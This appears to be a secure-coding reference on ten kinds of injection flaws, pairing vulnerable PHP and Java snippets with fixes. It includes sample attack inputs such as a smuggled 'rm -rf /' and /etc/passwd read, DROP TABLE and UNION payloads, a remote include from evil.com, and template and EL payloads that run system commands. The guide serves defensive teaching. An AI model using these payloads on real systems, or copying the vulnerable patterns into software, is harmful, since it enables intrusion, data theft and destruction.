# CODE INJECTION

## OVERVIEW
Code injection vulnerabilities occur when untrusted data is included in executed code, leading to arbitrary code execution, data theft, or system compromise.

## TYPES OF INJECTION

### 1. SQL Injection (SQLi)

**Definition**: Attacker interferes with queries an application makes to its database.

**Vulnerability**:
```php
// VULNERABLE: User input directly interpolated
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = $id";
$result = $db->query($query);

// Attacker input: id=1; DROP TABLE users; --
// Query becomes: SELECT * FROM users WHERE id = 1; DROP TABLE users; --
```

**Impact**:
- Data theft (expose all user records)
- Data deletion (DROP TABLE)
- Authentication bypass (login as admin)
- Data modification (update passwords)

**Prevention**:
```php
// 1. Parameterized queries (Recommended)
$stmt = $db->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);

// 2. Type casting (for integers)
$id = (int) $_GET['id'];
$query = "SELECT * FROM users WHERE id = $id";

// 3. Eloquent ORM (Laravel)
$user = User::find($id);  // Automatically parameterized
```

**Common SQLi Patterns**:
- `1' OR '1'='1` - Always true condition
- `1; DROP TABLE users;--` - Multiple statements
- `' UNION SELECT username, password FROM users--` - Data exfiltration
- `admin'--` - Comment out rest of query

---

### 2. Command Injection

**Definition**: Attacker executes arbitrary system commands through application input.

**Vulnerability**:
```php
// VULNERABLE: User input passed to shell
$filename = $_GET['file'];
system("cat /var/www/uploads/$filename");

// Attacker input: file=../../etc/passwd; rm -rf /
// Command becomes: cat /var/www/uploads/../../etc/passwd; rm -rf /
```

**Impact**:
- Arbitrary code execution
- File system access/read/write
- Remote shell access
- Full system compromise

**Prevention**:
```php
// 1. Avoid shell functions (Recommended)
// Use PHP built-in functions instead
$content = file_get_contents("/var/www/uploads/$sanitized_filename");

// 2. escapeshellarg() (if shell required)
$sanitized = escapeshellarg($filename);
system("cat /var/www/uploads/$sanitized");

// 3. escapeshellcmd() (less safe, use with caution)
$sanitized = escapeshellcmd($filename);
system("cat $sanitized");

// 4. Allowlist validation (Best for filenames)
$allowed = ['file1.txt', 'file2.txt'];
if (!in_array($filename, $allowed)) {
    throw new Exception('Invalid file');
}
```

**Vulnerable Functions to Avoid**:
- `system()`, `exec()`, `shell_exec()`, `passthru()`
- `popen()`, `proc_open()`
- `` (backticks)

---

### 3. Code Injection (PHP)

**Definition**: Attacker injects PHP code that gets executed by the application.

**Vulnerability**:
```php
// VULNERABLE: User input passed to eval()
$code = $_GET['code'];
eval("\$result = $code;");

// Attacker input: code=phpinfo();
// Executes: $result = phpinfo();

// Another example: include()
$page = $_GET['page'];
include("$page.php");
// Attacker input: page=http://evil.com/malicious
```

**Impact**:
- Arbitrary PHP code execution
- Full application control
- Server compromise
- Backdoor creation

**Prevention**:
```php
// 1. NEVER use eval() (Strongest recommendation)
// Find alternative solutions

// 2. Safe include() with allowlist
$allowed = ['home', 'about', 'contact'];
$page = $_GET['page'];
if (!in_array($page, $allowed)) {
    die('Invalid page');
}
include("$page.php");

// 3. Avoid dynamic includes
// Hardcode or use routing
switch($_GET['page']) {
    case 'home': include 'home.php'; break;
    case 'about': include 'about.php'; break;
}
```

---

### 4. Template Injection

**Definition**: Attacker injects malicious template syntax into server-side templates.

**Vulnerability**:
```php
// VULNERABLE: Twig template with user input
$template = $_GET['template'];
$renderer->render("$template", $data);

// Attacker input: template={{_self.env.display("cat /etc/passwd")}}
```

**Frameworks Affected**:
- Twig (PHP)
- Jinja2 (Python)
- FreeMarker (Java)
- Velocity (Java)

**Prevention**:
```php
// 1. Use allowlist for template names
$allowed = ['home', 'dashboard', 'profile'];
$template = $_GET['template'];
if (!in_array($template, $allowed)) {
    die('Invalid template');
}

// 2. Sanitize user input passed to templates
$safe_data = htmlspecialchars($user_input, ENT_QUOTES);
```

---

### 5. Expression Language Injection

**Definition**: Attacker injects malicious expressions into frameworks using EL resolvers.

**Vulnerability**:
```java
// VULNERABLE: User input in EL expression
String expression = request.getParameter("expr");
ValueExpression ve = factory.createValueExpression(context, expression, String.class);
ve.getValue(context);

// Attacker input: expr=${"".getClass().forName("java.lang.Runtime").getRuntime().exec("calc.exe")}
```

**Prevention**:
```java
// 1. Disable EL if not needed
// 2. Sanitize EL expressions
// 3. Use safe evaluation methods
// 4. Validate input against allowlist
```

---

### 6. Object Injection (PHP)

**Definition**: Attacker injects serialized objects that execute code when unserialized.

**Vulnerability**:
```php
// VULNERABLE: Unserialize user input
$object = unserialize($_GET['data']);

// If object has __wakeup() or __destruct() magic method,
// malicious code gets executed
```

**Impact**:
- Remote code execution
- Authentication bypass
- Data modification

**Prevention**:
```php
// 1. Use JSON instead of serialization (Recommended)
$object = json_decode($_GET['data'], true);

// 2. Validate serialized data
// 3. Use allowlist of allowed classes
class SafeUnserializer {
    public function unserialize(string $data) {
        return unserialize($data, ['allowed_classes' => [MyClass::class]]);
    }
}

// 4. Disable unserialize if not needed
// Disable functions in php.ini: disable_functions = unserialize
```

---

### 7. LDAP Injection

**Definition**: Attacker manipulates LDAP queries through untrusted input.

**Vulnerability**:
```php
// VULNERABLE: User input in LDAP query
$user = $_GET['user'];
$filter = "(uid=$user)";
$ldap->search("dc=example,dc=com", $filter);

// Attacker input: user=*)(uid=*))%00
// Query becomes: (uid=*)(uid=*))%00
```

**Prevention**:
```php
// 1. Use LDAP escaping functions
$safe_user = ldap_escape($user, null, LDAP_ESCAPE_FILTER);
$filter = "(uid=$safe_user)";

// 2. Allowlist validation
```

---

### 8. NoSQL Injection

**Definition**: Attacker injects malicious operators into NoSQL queries (MongoDB, etc.).

**Vulnerability**:
```php
// VULNERABLE: User input in MongoDB query
$username = $_POST['username'];
$password = $_POST['password'];
$query = ['username' => $username, 'password' => $password];
$user = $db->users->findOne($query);

// Attacker input: username[$ne]=null&password[$ne]=null
// Becomes: ['username' => ['$ne' => null], 'password' => ['$ne' => null]]
// Finds first user, bypasses authentication!
```

**Prevention**:
```php
// 1. Use type-safe queries
$query = ['username' => (string)$username, 'password' => (string)$password];

// 2. Use input validation
// 3. Use library's built-in parameterization
// 4. Sanitize special operators
```

---

### 9. Header Injection

**Definition**: Attacker injects malicious headers via user input.

**Vulnerability**:
```php
// VULNERABLE: User input in HTTP headers
$email = $_GET['email'];
header("From: $email");

// Attacker input: email=hacker@example.com\r\nBcc: victim@example.com
// Adds Bcc header, can steal all emails
```

**Prevention**:
```php
// 1. Filter CRLF characters
$safe_email = str_replace(["\r", "\n"], '', $email);
header("From: $safe_email");

// 2. Validate email format
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    die('Invalid email');
}
```

---

### 10. Log Injection

**Definition**: Attacker injects malicious entries into application logs.

**Vulnerability**:
```php
// VULNERABLE: User input in logs
$user = $_GET['user'];
error_log("User login: $user");

// Attacker input: user=admin\r\nUser logout: admin
// Creates fake log entries
```

**Prevention**:
```php
// 1. Sanitize CRLF and special characters
$safe_user = str_replace(["\r", "\n", "\t"], '', $user);
error_log("User login: $safe_user");

// 2. Use structured logging (JSON)
error_log(json_encode(['event' => 'login', 'user' => $user]));
```

---

## GENERAL PREVENTION PRINCIPLES

### 1. Input Validation
- **Allowlist**: Only accept known good values
- **Blocklist**: Reject known bad patterns (less secure)
- **Type validation**: Ensure correct data types
- **Length limits**: Restrict input length

### 2. Output Encoding
- HTML escaping: `htmlspecialchars()`
- URL encoding: `urlencode()`
- JavaScript encoding: `json_encode()`
- SQL encoding: Parameterized queries

### 3. Least Privilege
- Database user with minimal permissions
- No root/admin access for web apps
- Separate read/write database accounts

### 4. Defense in Depth
- Multiple layers of validation
- Input validation + output encoding
- Web application firewall (WAF)
- Regular security audits

---

## DETECTION CHECKLIST

### Code Review Red Flags
- `eval()` usage
- String concatenation in queries
- `system()`, `exec()`, `shell_exec()` with user input
- `include()` with user input
- `unserialize()` with user input
- Missing parameterized queries
- Direct variable interpolation in commands

### Automated Detection
- Static analysis tools (PHPStan, Psalm)
- SAST tools (SonarQube, Checkmarx)
- DAST tools (OWASP ZAP, Burp Suite)
- Linting with security rules

---

## OWASP TOP 10 REFERENCES

- **A03:2021 Injection**: Includes all injection types
- **A08:2021 Software and Data Integrity Failures**: Object injection
- Related: A02:2021 Cryptographic Failures (related to secure data handling)

---

## CROSS-REFERENCES
- For OWASP Top 10: @secops-engineering/owasp/OWASP-TOP10.md
- For input validation: @secops-engineering/security/INPUT-VALIDATION.md
- For performance issues: @performance/COMMON-ISSUES.md
